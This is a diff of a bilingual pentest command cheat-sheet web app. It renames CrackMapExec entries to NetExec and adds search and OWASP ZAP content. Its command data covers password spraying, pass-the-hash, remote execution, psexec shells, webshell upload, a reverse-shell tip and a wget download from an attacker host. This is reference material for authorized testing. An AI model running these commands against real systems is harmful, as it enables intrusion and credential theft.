+.target-session-preview-title{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:10px;opacity:.6;}
+.target-session-row{display:flex;align-items:center;gap:8px;padding:3px 0;font-size:11px;}
+.target-session-key{color:var(--muted);width:80px;flex-shrink:0;opacity:.7;}
+.target-session-val{color:var(--orange);font-family:var(--mono);}
+.target-session-empty{color:var(--muted);opacity:.3;}
+
+/* SEARCH OVERLAY */
+.search-overlay{position:fixed;inset:0;background:rgba(0,0,0,.72);z-index:9000;display:none;align-items:flex-start;justify-content:center;padding-top:72px;backdrop-filter:blur(3px);}
+.search-overlay.open{display:flex;}
+.search-box{background:var(--bg2);border:1px solid var(--border);border-radius:8px;width:640px;max-width:90vw;overflow:hidden;box-shadow:0 24px 64px rgba(0,0,0,.7);}
+.search-input-wrap{display:flex;align-items:center;gap:12px;padding:12px 16px;border-bottom:1px solid var(--border);}
+.search-icon{color:var(--muted);font-size:17px;opacity:.4;flex-shrink:0;}
+.search-input{flex:1;background:none;border:none;color:var(--text);font-family:var(--mono);font-size:14px;outline:none;}
+.search-input::placeholder{color:var(--muted);opacity:.32;}
+.search-kbd{background:var(--bg3);border:1px solid var(--border);color:var(--muted);padding:2px 7px;border-radius:3px;font-family:var(--mono);font-size:10px;flex-shrink:0;}
+.search-results{max-height:420px;overflow-y:auto;}
+.search-item{display:flex;align-items:center;gap:10px;padding:8px 16px;cursor:pointer;border-bottom:1px solid var(--border);transition:background .1s;}
+.search-item:last-child{border-bottom:none;}
+.search-item:hover,.search-item.focused{background:rgba(110,142,240,.07);}
+.search-item-tool{font-size:10px;font-weight:700;color:var(--cyan);background:#141e38;border:1px solid #1e2d58;padding:2px 7px;border-radius:3px;white-space:nowrap;flex-shrink:0;min-width:58px;text-align:center;}
+.search-item-purpose{font-size:12px;color:var(--text);flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.search-item-cmd{font-size:11px;color:var(--orange);font-family:var(--mono);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:175px;opacity:.6;}
+.search-empty{padding:26px;text-align:center;color:var(--muted);font-size:12px;line-height:1.65;}
+.search-footer{padding:8px 16px;border-top:1px solid var(--border);font-size:10px;color:var(--muted);opacity:.4;display:flex;gap:16px;}
+.btn-search{background:none;border:1px solid var(--border);color:var(--muted);padding:3px 10px;font-family:var(--mono);font-size:11px;cursor:pointer;border-radius:3px;transition:all .15s;letter-spacing:.3px;}
+.btn-search:hover{border-color:var(--cyan);color:var(--cyan);}
 </style>
 </head>
 <body>
@@ -241,6 +291,9 @@ body{background:var(--bg);color:var(--text);font-family:var(--mono);height:100vh
   <div class="ip-label" id="ipLabel">TARGET</div>
   <input class="ip-input" id="ipInput" type="text" placeholder="10.10.10.X" autocomplete="off" spellcheck="false">
   <button class="btn-hdr" id="clearBtn" onclick="clearState()">CLEAR STATE</button>
+  <button class="btn-search" onclick="openSearch()" title="Ctrl+K">⌕ SEARCH</button>
+  <div class="hdr-fill"></div>
+  <div id="sessionHdr"></div>
   <div class="lang-wrap">
     <button class="lang-btn" data-lang="en" onclick="setLang('en')">EN</button>
     <button class="lang-btn" data-lang="tr" onclick="setLang('tr')">TR</button>
@@ -259,6 +312,19 @@ body{background:var(--bg);color:var(--text);font-family:var(--mono);height:100vh
  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝</div>
       <p>Enter target IP · click a service or add ports with <b style="color:var(--green)">+</b> then open SESSION</p>
     </div>
+  </div>
+</div>
+<div class="search-overlay" id="searchOverlay" onclick="closeSearch()">
+  <div class="search-box" onclick="event.stopPropagation()">
+    <div class="search-input-wrap">
+      <span class="search-icon">⌕</span>
+      <input class="search-input" id="searchInput" type="text" placeholder="Search commands, tools, descriptions..." autocomplete="off" spellcheck="false" oninput="filterSearch(this.value)" onkeydown="searchKeydown(event)">
+      <kbd class="search-kbd">ESC</kbd>
+    </div>
+    <div class="search-results" id="searchResults">
+      <div class="search-empty">Start typing to search across all commands...</div>
+    </div>
+    <div class="search-footer"><span>↑↓ navigate</span><span>↵ open tool</span><span>ESC close</span></div>
   </div>
 </div>
 <script>
@@ -485,9 +551,9 @@ const DB = {
 
   smb:{label:"SMB",port:"139/445",phases:[
     {name:"Phase 1 — Quick Info (no creds)",tools:[
-      {name:"crackmapexec",cmds:[
-        {p:"OS, hostname, domain, signing status",c:"crackmapexec smb TARGETIP",h:"Run first, always. Gives OS version, hostname, domain, SMB signing — all without credentials."},
-        {p:"Check guest / null session",c:"crackmapexec smb TARGETIP -u '' -p ''\ncrackmapexec smb TARGETIP -u 'guest' -p ''",h:"[+] = successful login. Note if null or guest session works — enables share/user enum."},
+      {name:"nxc",cmds:[
+        {p:"OS, hostname, domain, signing status",c:"nxc smb TARGETIP",h:"Run first, always. Gives OS version, hostname, domain, SMB signing — all without credentials."},
+        {p:"Check guest / null session",c:"nxc smb TARGETIP -u '' -p ''\nnxc smb TARGETIP -u 'guest' -p ''",h:"[+] = successful login. Note if null or guest session works — enables share/user enum."},
       ]},
       {name:"nmap",cmds:[
         {p:"SMB OS discovery",c:"nmap -p 139,445 --script smb-os-discovery TARGETIP",h:"Hostname, domain, OS info via SMB. Cross-check with CME output."},
@@ -496,11 +562,11 @@ const DB = {
       ]},
     ]},
     {name:"Phase 2 — Share Enumeration",tools:[
-      {name:"crackmapexec",cmds:[
-        {p:"List shares — null session",c:"crackmapexec smb TARGETIP -u '' -p '' --shares",h:"Non-default shares (not C$, ADMIN$, IPC$, NETLOGON, SYSVOL) are interesting. Note READ/WRITE."},
-        {p:"List shares — guest",c:"crackmapexec smb TARGETIP -u 'guest' -p '' --shares",h:"Some servers allow guest but not null. Try both."},
-        {p:"Spider all shares — list every file",c:"crackmapexec smb TARGETIP -u '' -p '' -M spider_plus",h:"Lists all accessible files. Find juicy files before downloading everything."},
-        {p:"Authenticated share list",c:"crackmapexec smb TARGETIP -u 'username' -p 'password' --shares",h:"Shows all shares user can access with permission level."},
+      {name:"nxc",cmds:[
+        {p:"List shares — null session",c:"nxc smb TARGETIP -u '' -p '' --shares",h:"Non-default shares (not C$, ADMIN$, IPC$, NETLOGON, SYSVOL) are interesting. Note READ/WRITE."},
+        {p:"List shares — guest",c:"nxc smb TARGETIP -u 'guest' -p '' --shares",h:"Some servers allow guest but not null. Try both."},
+        {p:"Spider all shares — list every file",c:"nxc smb TARGETIP -u '' -p '' -M spider_plus",h:"Lists all accessible files. Find juicy files before downloading everything."},
+        {p:"Authenticated share list",c:"nxc smb TARGETIP -u 'username' -p 'password' --shares",h:"Shows all shares user can access with permission level."},
       ]},
       {name:"smbmap",cmds:[
         {p:"Shares + permissions — null",c:"smbmap -H TARGETIP",h:"READ/WRITE per share for anonymous. Cleaner permission view."},
@@ -522,9 +588,9 @@ const DB = {
         {p:"Download all files from share",c:"smbclient \\\\\\\\TARGETIP\\\\SHARENAME -N -c 'recurse ON; prompt OFF; lcd /tmp/smb/; mget *'",h:"mkdir /tmp/smb first. Then: grep -rn 'password\\|secret\\|key\\|token' /tmp/smb/"},
         {p:"Upload to writable share",c:"smbclient \\\\\\\\TARGETIP\\\\SHARENAME -N\n# inside: put localfile.php",h:"Write access → upload webshell if share maps to webroot, or SCF/LNK for hash capture."},
       ]},
-      {name:"crackmapexec",cmds:[
-        {p:"Spider + save file listing",c:"crackmapexec smb TARGETIP -u 'user' -p 'pass' -M spider_plus -o OUTPUT_FOLDER=/tmp/spidered",h:"Creates JSON of all files. Grep for interesting filenames."},
-        {p:"Download specific file",c:"crackmapexec smb TARGETIP -u 'user' -p 'pass' --get-file 'SHARE\\path\\file.txt' /tmp/file.txt",h:"Download specific file found in spider output."},
+      {name:"nxc",cmds:[
+        {p:"Spider + save file listing",c:"nxc smb TARGETIP -u 'user' -p 'pass' -M spider_plus -o OUTPUT_FOLDER=/tmp/spidered",h:"Creates JSON of all files. Grep for interesting filenames."},
+        {p:"Download specific file",c:"nxc smb TARGETIP -u 'user' -p 'pass' --get-file 'SHARE\\path\\file.txt' /tmp/file.txt",h:"Download specific file found in spider output."},
       ]},
       {name:"mount",cmds:[
         {p:"Mount share — null",c:"sudo mkdir -p /mnt/smb\nsudo mount -t cifs //TARGETIP/SHARENAME /mnt/smb -o username='',password=''",h:"Browse with normal file tools. Better for large shares."},
@@ -532,9 +598,9 @@ const DB = {
       ]},
     ]},
     {name:"Phase 4 — User Enumeration",tools:[
-      {name:"crackmapexec",cmds:[
-        {p:"RID brute — all users/groups",c:"crackmapexec smb TARGETIP -u '' -p '' --rid-brute",h:"Automated RID cycling. Works even without enumdomusers. Best tool for this."},
-        {p:"Authenticated user + group list",c:"crackmapexec smb TARGETIP -u 'user' -p 'pass' --users\ncrackmapexec smb TARGETIP -u 'user' -p 'pass' --groups",h:"More complete with creds. Gets disabled accounts too."},
+      {name:"nxc",cmds:[
+        {p:"RID brute — all users/groups",c:"nxc smb TARGETIP -u '' -p '' --rid-brute",h:"Automated RID cycling. Works even without enumdomusers. Best tool for this."},
+        {p:"Authenticated user + group list",c:"nxc smb TARGETIP -u 'user' -p 'pass' --users\nnxc smb TARGETIP -u 'user' -p 'pass' --groups",h:"More complete with creds. Gets disabled accounts too."},
       ]},
       {name:"rpcclient",cmds:[
         {p:"Null session — interactive enum",c:"rpcclient -U '' -N TARGETIP\n# enumdomusers\n# enumdomgroups\n# queryuser <RID>\n# querydispinfo",h:"enumdomusers → usernames+RIDs. RID 500=Admin 501=Guest. queryuser 0x1f4 = Admin details."},
@@ -545,11 +611,11 @@ const DB = {
       ]},
     ]},
     {name:"Phase 5 — Password Policy & Spraying",tools:[
-      {name:"crackmapexec",cmds:[
-        {p:"Get password policy (CHECK BEFORE SPRAYING)",c:"crackmapexec smb TARGETIP -u '' -p '' --pass-pol",h:"CRITICAL. Note lockout threshold. If 3 → max 2 attempts per user then wait lockout duration."},
-        {p:"Password spray — one pass many users",c:"crackmapexec smb TARGETIP -u users.txt -p 'Password123!' --continue-on-success",h:"Common: Password1 Welcome1 CompanyName1 Season+Year. --continue-on-success = don't stop at first hit."},
-        {p:"Verify credentials",c:"crackmapexec smb TARGETIP -u 'user' -p 'password'",h:"[+] = valid. (Pwn3d!) = local admin."},
-        {p:"Pass the hash",c:"crackmapexec smb TARGETIP -u 'administrator' -H 'NTLM_HASH'",h:"NT hash only (32 hex chars). Get from secretsdump or mimikatz."},
+      {name:"nxc",cmds:[
+        {p:"Get password policy (CHECK BEFORE SPRAYING)",c:"nxc smb TARGETIP -u '' -p '' --pass-pol",h:"CRITICAL. Note lockout threshold. If 3 → max 2 attempts per user then wait lockout duration."},
+        {p:"Password spray — one pass many users",c:"nxc smb TARGETIP -u users.txt -p 'Password123!' --continue-on-success",h:"Common: Password1 Welcome1 CompanyName1 Season+Year. --continue-on-success = don't stop at first hit."},
+        {p:"Verify credentials",c:"nxc smb TARGETIP -u 'user' -p 'password'",h:"[+] = valid. (Pwn3d!) = local admin."},
+        {p:"Pass the hash",c:"nxc smb TARGETIP -u 'administrator' -H 'NTLM_HASH'",h:"NT hash only (32 hex chars). Get from secretsdump or mimikatz."},
       ]},
     ]},
     {name:"Phase 6 — Vulnerability Scan",tools:[
@@ -564,9 +630,9 @@ const DB = {
       ]},
     ]},
     {name:"Phase 7 — Post-Auth Code Execution",tools:[
-      {name:"crackmapexec",cmds:[
-        {p:"Execute CMD command",c:"crackmapexec smb TARGETIP -u 'admin' -p 'pass' -x 'whoami'",h:"-x = CMD, -X = PowerShell. (Pwn3d!) must be shown."},
-        {p:"Execute PS command",c:"crackmapexec smb TARGETIP -u 'admin' -p 'pass' -X 'Get-LocalUser'",h:"PowerShell execution. Good for: whoami /all, ipconfig, net user."},
+      {name:"nxc",cmds:[
+        {p:"Execute CMD command",c:"nxc smb TARGETIP -u 'admin' -p 'pass' -x 'whoami'",h:"-x = CMD, -X = PowerShell. (Pwn3d!) must be shown."},
+        {p:"Execute PS command",c:"nxc smb TARGETIP -u 'admin' -p 'pass' -X 'Get-LocalUser'",h:"PowerShell execution. Good for: whoami /all, ipconfig, net user."},
       ]},
       {name:"impacket",cmds:[
         {p:"psexec — SYSTEM shell",c:"impacket-psexec domain/username:password@TARGETIP",h:"Creates service + drops binary. Gives SYSTEM. Noisy but reliable."},
@@ -712,8 +778,8 @@ const DB = {
         {p:"MS-SQL info + NTLM info",c:"nmap -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-ntlm-info TARGETIP",h:"ntlm-info leaks hostname and domain without authentication."},
         {p:"Empty password check",c:"nmap -p 1433 --script ms-sql-empty-password TARGETIP",h:"Checks sa with empty password."},
       ]},
-      {name:"crackmapexec",cmds:[
-        {p:"Check MSSQL access",c:"crackmapexec mssql TARGETIP -u 'sa' -p ''\ncrackmapexec mssql TARGETIP -u 'sa' -p 'sa'",h:"Default: sa (empty), sa/sa, sa/Password1."},
+      {name:"nxc",cmds:[
+        {p:"Check MSSQL access",c:"nxc mssql TARGETIP -u 'sa' -p ''\nnxc mssql TARGETIP -u 'sa' -p 'sa'",h:"Default: sa (empty), sa/sa, sa/Password1."},
       ]},
       {name:"impacket-mssqlclient",cmds:[
         {p:"Connect — SQL auth",c:"impacket-mssqlclient sa:password@TARGETIP",h:"Interactive MSSQL client. Good for running queries and enabling xp_cmdshell."},
@@ -760,9 +826,9 @@ const DB = {
 
   winrm:{label:"WinRM",port:"5985/5986",phases:[
     {name:"Phase 1 — Access Check",tools:[
-      {name:"crackmapexec",cmds:[
-        {p:"Check WinRM access",c:"crackmapexec winrm TARGETIP -u 'username' -p 'password'",h:"(Pwn3d!) = user is in Remote Management Users group → PowerShell shell available."},
-        {p:"Spray credentials",c:"crackmapexec winrm TARGETIP -u users.txt -p passwords.txt --continue-on-success",h:"Same spray logic as SMB but targeting WinRM."},
+      {name:"nxc",cmds:[
+        {p:"Check WinRM access",c:"nxc winrm TARGETIP -u 'username' -p 'password'",h:"(Pwn3d!) = user is in Remote Management Users group → PowerShell shell available."},
+        {p:"Spray credentials",c:"nxc winrm TARGETIP -u users.txt -p passwords.txt --continue-on-success",h:"Same spray logic as SMB but targeting WinRM."},
       ]},
       {name:"nmap (vuln)",cmds:[
         {p:"WinRM vuln scan",c:"nmap -p 5985,5986 --script=vuln TARGETIP",h:"Broad vuln scan on WinRM ports."},
@@ -1130,7 +1196,7 @@ function setLang(lang){state.lang=lang;saveState();applyLang();renderSidebar();i
 // ═══════════════════════════════════════════════════
 //  TOOLS DB
 // ═══════════════════════════════════════════════════
-const TOOLS_ORDER = ['nmap','gobuster','ffuf','cme','enum4linux','nikto','hydra','nuclei','peass','sqlmap','impacket','xfreerdp','hashcrack','searchsploit','evilwinrm','msfvenom','responder','kerbrute','chisel','wpscan','pspy','pwncat','les','pwntools','gdb','socat','strace','binwalk'];
+const TOOLS_ORDER = ['nmap','gobuster','ffuf','nxc','enum4linux','nikto','hydra','nuclei','peass','sqlmap','impacket','xfreerdp','hashcrack','searchsploit','evilwinrm','msfvenom','responder','kerbrute','chisel','wpscan','zap','pspy','pwncat','les','pwntools','gdb','socat','strace','binwalk'];
 
 const TOOLS_INFO = {
   nmap:{
@@ -1178,19 +1244,19 @@ const TOOLS_INFO = {
       creds:["FUZZ anahtar kelimesini isteğin herhangi bir yerine yerleştir","Gürültüyü filtrele: -fc (status code) -fs (size) -fw (kelime) -fl (satır)","Geçerli yanıtları eşleştir: -mc 200,204,301,302,307","WAF/IDS tetiklememek için -rate ile hız sınırla","Birden fazla wordlist: -w liste1.txt -w liste2.txt:W2"],
     },
   },
-  cme:{
+  nxc:{
     platform:'win',
     en:{
-      summary:"CrackMapExec (CME / NetExec) is the Swiss army knife for Windows and Active Directory pentesting. It operates over SMB, LDAP, WinRM, MSSQL, and SSH. Used for enumeration, password spraying, credential validation, remote command execution, and credential dumping — all from a single tool.",
-      lookFor:["Valid domain credentials (Pwn3d! = admin/RCE access)","SMB signing disabled → relay attack opportunity (NTLM relay)","Logged-on users, local admins, domain admins","Accessible shares with sensitive files","Password policy (lockout threshold before spraying)","Kerberoastable and AS-REP roastable accounts"],
-      vulns:["Pass-the-Hash: authenticate with NTLM hash directly","Pass-the-Ticket: use stolen Kerberos tickets","BloodHound collection: map attack paths in AD","Secretsdump: extract SAM, LSA, NTDS.dit hashes","MS17-010 / EternalBlue via SMB module","Kerberoasting / AS-REP Roasting via LDAP module"],
-      creds:["(Pwn3d!) in output = admin rights on that host","Use --local-auth for local accounts vs domain accounts","Always check password policy before spraying: --pass-pol","Save all results: | tee cme_output.txt","netexec is the maintained fork of crackmapexec — syntax is identical"],
+      summary:"NetExec (nxc) is the actively maintained successor to CrackMapExec — the Swiss army knife for Windows and Active Directory pentesting. It operates over SMB, LDAP, WinRM, MSSQL, SSH, RDP, FTP and more. Used for credential validation, password spraying, remote command execution, credential dumping, and full AD enumeration from a single unified tool. Receives constant updates with new modules and protocol support.",
+      lookFor:["Valid credentials — (Pwn3d!) = local admin / RCE access","SMB signing disabled → NTLM relay attack opportunity","Logged-on users, local admins, domain admins — high-value targets","Accessible non-default shares containing sensitive files","Password policy (lockout threshold) — ALWAYS check before spraying","Kerberoastable accounts (SPNs) and AS-REP roastable accounts","Hosts with WinRM open (5985/5986) — direct PS shell via evil-winrm"],
+      vulns:["Pass-the-Hash: authenticate with NT hash, no plaintext needed","Pass-the-Ticket: use stolen Kerberos tickets directly","BloodHound collection: map all AD attack paths in one command","Secretsdump: extract SAM, LSA, NTDS.dit hashes remotely","Kerberoasting / AS-REP Roasting via LDAP module","NTLM relay: disable SMB+HTTP in Responder, spray relay targets with nxc","MS17-010 detection and exploitation via SMB module"],
+      creds:["Install: pip install netexec  OR  apt install nxc","(Pwn3d!) = admin rights. Immediately use -x or -X for command execution","Always check password policy first: nxc smb TARGETIP -u user -p pass --pass-pol","Save all output: nxc smb TARGETIP [...] | tee nxc_output.txt","Use --local-auth for local account spraying (SAM), omit for domain accounts","Generate relay target list: nxc smb TARGETIP/24 --gen-relay-list relay.txt"],
     },
     tr:{
-      summary:"CrackMapExec (CME / NetExec), Windows ve Active Directory pentest'lerinde İsviçre çakısı niteliğindedir. SMB, LDAP, WinRM, MSSQL ve SSH üzerinden çalışır. Tek araçla keşif, parola spreyi, credential doğrulama, uzak komut çalıştırma ve credential dump işlemleri yapılır.",
-      lookFor:["Geçerli domain credential'ları (Pwn3d! = admin/RCE erişimi)","SMB signing devre dışı → relay saldırısı fırsatı (NTLM relay)","Oturum açmış kullanıcılar, local admin'ler, domain admin'ler","Hassas dosya içeren erişilebilir paylaşımlar","Parola politikası (spraying öncesi lockout eşiği)","Kerberoast ve AS-REP roast yapılabilir hesaplar"],
-      vulns:["Pass-the-Hash: NTLM hash ile doğrudan kimlik doğrulama","Pass-the-Ticket: çalınan Kerberos ticket'larını kullanma","BloodHound toplama: AD'deki saldırı yollarını haritalama","Secretsdump: SAM, LSA, NTDS.dit hash'lerini çıkarma","SMB modülü ile MS17-010 / EternalBlue","LDAP modülü ile Kerberoasting / AS-REP Roasting"],
-      creds:["Çıktıda (Pwn3d!) = o hostta admin yetkisi","Local hesaplar için --local-auth kullan","Spraying öncesi parola politikasını kontrol et: --pass-pol","Tüm sonuçları kaydet: | tee cme_output.txt","netexec, crackmapexec'in aktif fork'udur — söz dizimi aynıdır"],
+      summary:"NetExec (nxc), CrackMapExec'in aktif olarak bakımı yapılan halefidir — Windows ve Active Directory pentest'lerinin İsviçre çakısı. SMB, LDAP, WinRM, MSSQL, SSH, RDP, FTP ve daha fazlası üzerinden çalışır. Tek birleşik araçla credential doğrulama, parola spreyi, uzak komut çalıştırma, credential dump ve tam AD enumeration yapılır. Yeni modüller ve protokol desteğiyle sürekli güncelleme almaktadır.",
+      lookFor:["Geçerli credential'lar — (Pwn3d!) = local admin / RCE erişimi","SMB signing devre dışı → NTLM relay saldırısı fırsatı","Oturum açmış kullanıcılar, local/domain admin'ler — yüksek değerli hedefler","Hassas dosya içeren standart dışı paylaşımlar","Parola politikası (lockout eşiği) — spraying öncesi MUTLAKA kontrol et","Kerberoastable hesaplar (SPN'ler) ve AS-REP roastable hesaplar","WinRM açık hostlar (5985/5986) — evil-winrm ile doğrudan PS shell"],
+      vulns:["Pass-the-Hash: NT hash ile kimlik doğrulama, düz metin gerekmez","Pass-the-Ticket: çalınan Kerberos ticket'larını doğrudan kullan","BloodHound toplama: tek komutla tüm AD saldırı yollarını haritalandır","Secretsdump: SAM, LSA, NTDS.dit hash'lerini uzaktan çıkar","LDAP modülü ile Kerberoasting / AS-REP Roasting","NTLM relay: Responder'da SMB+HTTP'yi devre dışı bırak, nxc ile relay hedeflerini tara","SMB modülü ile MS17-010 tespiti ve sömürüsü"],
+      creds:["Kurulum: pip install netexec  VEYA  apt install nxc","(Pwn3d!) = admin hakları. Hemen -x veya -X ile komut çalıştır","Her zaman önce parola politikasını kontrol et: nxc smb TARGETIP -u user -p pass --pass-pol","Tüm çıktıyı kaydet: nxc smb TARGETIP [...] | tee nxc_output.txt","Local hesap spreyi için --local-auth kullan (SAM), domain için kullanma","Relay hedef listesi oluştur: nxc smb TARGETIP/24 --gen-relay-list relay.txt"],
     },
   },
   enum4linux:{
@@ -1363,6 +1429,11 @@ const TOOLS_INFO = {
     en:{summary:"WPScan is the WordPress security scanner — the definitive tool for enumerating WordPress installations. It identifies themes, plugins, users, and configuration issues, then cross-references findings against the WPVulnDB vulnerability database. A WordPress target without WPScan is an incomplete assessment.",lookFor:["WordPress version — check for known CVEs","Installed plugins and their versions — most WP vulnerabilities are in plugins","Installed themes — some have file inclusion or upload vulnerabilities","Usernames — enumerate for password attacks (xmlrpc, login)","XML-RPC enabled — brute-force bypass, pingback SSRF","Directory listing enabled on uploads folder","Exposed wp-config.php backup files"],vulns:["Outdated plugin with known RCE/LFI/SQLi (check wpscan --api-token)","XML-RPC brute-force: unlimited attempts via multicall","Arbitrary file upload via vulnerable plugin/theme","wp-config.php exposure → DB credentials","User enumeration → password spray on wp-login.php","Unauthenticated REST API → user disclosure (/?wp-json/wp/v2/users)"],creds:["Get free API token from wpscan.com for vulnerability data","Use --enumerate u for users, p for plugins, t for themes, vp for vulnerable plugins","Brute-force with wpscan --passwords rockyou.txt after user enum","Check xmlrpc.php exists: curl -s http://TARGETIP/xmlrpc.php","Always try admin:admin, admin:password on wp-login.php first"]},
     tr:{summary:"WPScan, WordPress güvenlik tarayıcısıdır — WordPress kurulumlarını tespit etmek için vazgeçilmez araçtır. Tema, eklenti, kullanıcı ve yapılandırma sorunlarını tespit eder, ardından bulguları WPVulnDB zafiyet veritabanıyla karşılaştırır. WPScan olmadan WordPress hedef değerlendirmesi eksik kalır.",lookFor:["WordPress versiyonu — bilinen CVE'leri kontrol et","Yüklü eklentiler ve versiyonları — WP zafiyetlerinin çoğu eklentilerdedir","Yüklü temalar — bazılarında dosya dahil etme veya yükleme zafiyetleri var","Kullanıcı adları — parola saldırıları için tespit et (xmlrpc, login)","XML-RPC etkin — brute-force bypass, pingback SSRF","Uploads klasöründe dizin listeleme etkin","Açık wp-config.php yedek dosyaları"],vulns:["Bilinen RCE/LFI/SQLi'li güncel olmayan eklenti (wpscan --api-token ile kontrol)","XML-RPC brute-force: multicall üzerinden sınırsız deneme","Zafiyet içeren eklenti/tema üzerinden rastgele dosya yükleme","wp-config.php açığa çıkması → DB credential'ları","Kullanıcı tespiti → wp-login.php'de parola spreyi","Kimlik doğrulamasız REST API → kullanıcı ifşası (/?wp-json/wp/v2/users)"],creds:["Zafiyet verileri için wpscan.com'dan ücretsiz API token al","Kullanıcılar için --enumerate u, eklentiler p, temalar t, zafiyet eklentiler vp","Kullanıcı tespitinden sonra wpscan --passwords rockyou.txt ile brute-force","xmlrpc.php varlığını kontrol et: curl -s http://TARGETIP/xmlrpc.php","wp-login.php'de önce admin:admin, admin:password dene"]},
   },
+  zap:{
+    platform:'both',
+    en:{summary:"OWASP ZAP (Zed Attack Proxy) is a free, open-source web application security scanner and intercepting proxy. It sits between your browser and the target, capturing and modifying all HTTP/HTTPS traffic. ZAP includes automated scanning engines (Spider, Active Scan, AJAX Spider for JavaScript-heavy apps), a Fuzzer comparable to Burp Intruder, passive scanning for every request, and WebSocket support. The open-source alternative to Burp Suite Pro — with GUI, headless daemon mode, and a full REST API for CI/CD automation.",lookFor:["All HTTP/HTTPS requests/responses — manually review for logic flaws and auth issues","Spider/AJAX Spider output — map all application endpoints before scanning","Active Scan alerts — injection points, misconfigs, outdated components","Fuzzer results — parameter tampering, boundary values, IDOR via ID sequences","WebSocket frames — often contain unfiltered user input","Passive scan alerts — insecure headers, information disclosure, cookie flags","Hidden parameters and unlisted endpoints found by the spider","Authentication bypass possibilities in intercepted requests"],vulns:["SQL injection — detected and confirmed via Active Scan and Fuzzer","XSS (reflected/stored/DOM) — found by Active Scan automatically","Path traversal / LFI — Fuzzer with SecLists path-traversal payloads","IDOR — manually test numeric IDs in intercepted requests using Fuzzer Numberzz","CSRF — ZAP passive scan flags missing anti-CSRF tokens","Command injection — Fuzzer with OS command payloads from SecLists","Insecure headers — Missing CSP, HSTS, X-Frame-Options (passive scan)","JWT tampering — intercept and modify JWT tokens manually"],creds:["Start ZAP GUI: zaproxy  OR  /opt/zaproxy/zap.sh  OR  from applications menu","Set browser proxy to 127.0.0.1:8080 — ZAP intercepts all traffic automatically","Import ZAP CA cert in browser (Tools → Options → Network → Server Certificates → Save)","Add target to Scope before scanning: right-click site → Include in Context","Always Spider first → then AJAX Spider for JS apps → then Active Scan","Daemon mode for automation: zap.sh -daemon -port 8080 -config api.key=YOURKEY","REST API: curl http://localhost:8080/JSON/ — trigger any action programmatically"],},
+    tr:{summary:"OWASP ZAP (Zed Attack Proxy), ücretsiz ve açık kaynaklı bir web uygulama güvenlik tarayıcısı ve araya giren proxy'dir. Tarayıcınız ile hedef arasında oturarak tüm HTTP/HTTPS trafiğini yakalar ve değiştirmenize olanak tanır. ZAP; otomatik tarama motorları (Spider, Active Scan, JavaScript-ağırlıklı uygulamalar için AJAX Spider), Burp Intruder'a benzer bir Fuzzer, her istek için pasif tarama ve WebSocket desteği içerir. Burp Suite Pro'nun açık kaynak alternatifi — GUI, headless daemon modu ve CI/CD otomasyonu için tam REST API ile birlikte.",lookFor:["Tüm HTTP/HTTPS istek/yanıtları — mantık hataları ve auth sorunları için manuel incele","Spider/AJAX Spider çıktısı — taramadan önce tüm endpoint'leri haritalandır","Active Scan uyarıları — injection noktaları, yanlış yapılandırmalar","Fuzzer sonuçları — parametre manipülasyonu, IDOR için ID dizileri","WebSocket frame'leri — genellikle filtrelenmemiş kullanıcı girdisi içerir","Pasif tarama uyarıları — güvensiz headerlar, bilgi ifşası, cookie bayrakları","Spider tarafından bulunan gizli parametreler ve linklenmemiş endpoint'ler","Yakalanan isteklerde kimlik doğrulama bypass olanakları"],vulns:["SQL injection — Active Scan ve Fuzzer ile tespit ve doğrulama","XSS (yansıtılmış/depolanmış/DOM) — Active Scan tarafından otomatik bulunur","Path traversal / LFI — SecLists path-traversal payload'larıyla Fuzzer","IDOR — Fuzzer Numberzz ile yakalanan isteklerdeki sayısal ID'leri manuel test et","CSRF — ZAP pasif taraması eksik anti-CSRF token'larını işaretler","Komut injection — SecLists OS komut payload'larıyla Fuzzer","Güvensiz headerlar — Eksik CSP, HSTS, X-Frame-Options (pasif tarama)","JWT manipülasyonu — JWT token'larını manuel olarak yakala ve değiştir"],creds:["ZAP GUI başlat: zaproxy  VEYA  /opt/zaproxy/zap.sh  VEYA  uygulama menüsünden","Tarayıcı proxy'sini 127.0.0.1:8080 olarak ayarla — ZAP tüm trafiği otomatik yakalar","ZAP CA sertifikasını tarayıcıya yükle (Araçlar → Seçenekler → Ağ → Sunucu Sertifikaları → Kaydet)","Taramadan önce hedefi Scope'a ekle: siteye sağ tık → Bağlama Dahil Et","Her zaman önce Spider → JS uygulamalar için AJAX Spider → sonra Active Scan","Otomasyon için daemon modu: zap.sh -daemon -port 8080 -config api.key=ANAHTARIN","REST API: curl http://localhost:8080/JSON/ — herhangi bir işlemi programatik olarak tetikle"],},
+  },
   pspy:{
     platform:'lin',
     en:{summary:"pspy is an unprivileged Linux process monitor. It watches for new processes being spawned without requiring root access, by reading /proc. It is the go-to tool for discovering cron jobs, scripts run by root, and any recurring tasks that create privilege escalation opportunities. Essential on any Linux foothold.",lookFor:["Cron jobs running as root (UID=0) with writable scripts","Scripts called with relative paths — binary hijacking opportunity","Temporary file creation patterns — TOCTOU race conditions","Credentials passed as command-line arguments — visible in process list","Periodic cleanup scripts — may reveal backup or log paths","Services restarting — scripts that run on restart may be writable"],vulns:["Root cron job running user-writable script → insert reverse shell","Script using relative path command → place malicious binary in PATH","Process spawning with hardcoded credentials → grab from process list","Repeated file operations on writable path → race condition exploit","Backup script compressing sensitive files → wait for file, read it"],creds:["Run in background: ./pspy64 > pspy.log 2>&1 &","Watch for UID=0 entries — those run as root","Give it 2-5 minutes minimum — cron jobs may run on intervals","Use pspy32 on 32-bit systems, pspy64 on 64-bit (check with uname -m)","Transfer: wget http://ATTACKERIP:8080/pspy64 && chmod +x pspy64"]},
@@ -1525,58 +1596,60 @@ const TOOLS_DB = {
       ]},
     ],
   },
-  cme:{
-    label:'cme', desc:'CrackMapExec / NetExec',
+  nxc:{
+    label:'nxc', desc:'NetExec',
     categories:[
       {name:'SMB Enumeration',cmds:[
-        {p:'Enumerate hosts — null session',c:'cme smb TARGETIP',h:'Basic SMB banner grab. Shows hostname, domain, OS version, SMB signing status. No credentials needed.'},
-        {p:'Enumerate shares — null session',c:'cme smb TARGETIP --shares',h:'List all shares without credentials. Look for non-default shares (not ADMIN$, C$, IPC$).'},
